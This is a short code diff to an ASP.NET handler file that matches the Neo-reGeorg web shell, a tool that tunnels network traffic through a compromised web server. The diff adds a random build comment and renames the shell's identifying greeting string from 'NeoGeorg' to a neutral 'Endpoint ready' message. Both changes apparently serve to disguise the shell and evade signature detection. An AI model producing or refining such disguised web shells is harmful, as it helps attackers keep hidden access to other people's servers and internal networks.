@@ -1,3 +1,4 @@
+<%-- Build: jwxukmzv --%>
 <%@ WebHandler Language="C#" Class="GenericHandler1" %>
 
 using System;
@@ -110,7 +111,7 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
         int REDIRECTURL   = 8;
         int FORCEREDIRECT = 9;
         
-        String GeorgHello = "NeoGeorg says, 'All seems fine'";
+        String EndpointMsg = "PugGeorg says, 'Endpoint ready'";
         
         Object[] info  = new Object[40];
         Object[] rinfo = new Object[40];
@@ -260,7 +261,7 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
             }
             context.Response.Write(StrTr(Convert.ToBase64String(blv_encode(rinfo)), en, de));
         } else {
-            context.Response.Write(Encoding.Default.GetString(Convert.FromBase64String(StrTr(GeorgHello, de, en))));
+            context.Response.Write(Encoding.Default.GetString(Convert.FromBase64String(StrTr(EndpointMsg, de, en))));
         }
     }
 
